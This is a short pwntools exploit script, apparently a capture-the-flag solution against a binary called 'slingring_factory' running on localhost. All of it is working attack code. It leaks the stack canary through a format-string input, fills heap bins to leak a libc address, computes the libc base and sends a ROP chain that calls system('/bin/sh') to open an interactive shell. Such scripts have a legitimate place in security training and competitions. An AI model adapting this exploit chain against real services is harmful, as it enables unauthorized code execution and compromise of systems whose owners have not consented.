from pwn import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./slingring_factory", checksec=False)
# context.log_level = 'debug'
libc = ELF("./libc.so.6")

# Run binary 1st time
p = remote("localhost", 35678)

def forge(n):
  p.sendlineafter(b">>", b"2")
  p.sendlineafter(b"rings!", str(n))
  p.sendlineafter(b":", b"a")
  p.sendlineafter(b":", b"1")
  p.sendline()
 
def disc(n):
  p.sendlineafter(b">>", b"3")
  p.sendlineafter(b"discard?", str(n))

def show():
  p.sendlineafter(b">>", b"1")

# leak canary
p.sendlineafter(b"name?", "%7$p")
p.recvuntil("Hello, ")
canary = int(p.recvn(18), 16)
print(f"{hex(canary) = }")

# create 9 bins
for i in range(9):
  forge(i)

# free 8 bins
for i in range(8):
  disc(i)

# leak libc addr
show()
p.recvuntil(b"Slot #7")
p.recvuntil(b"   | ")

leak = u64(p.recvline().strip().ljust(8,b'\x00'))
print(f"{hex(leak) = }")

offset = 0x21ace0

libc.address = leak - offset
print(f"{hex(libc.address) = }")

# build payload
rop = ROP(libc)

rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = flat({0x38: p64(canary) + p64(0) + rop.chain()})

# send payload
p.sendline()
p.sendlineafter(b">>", "4")
p.sendlineafter(b":", "1")
p.sendlineafter(b":", payload)

p.clean()
p.interactive()
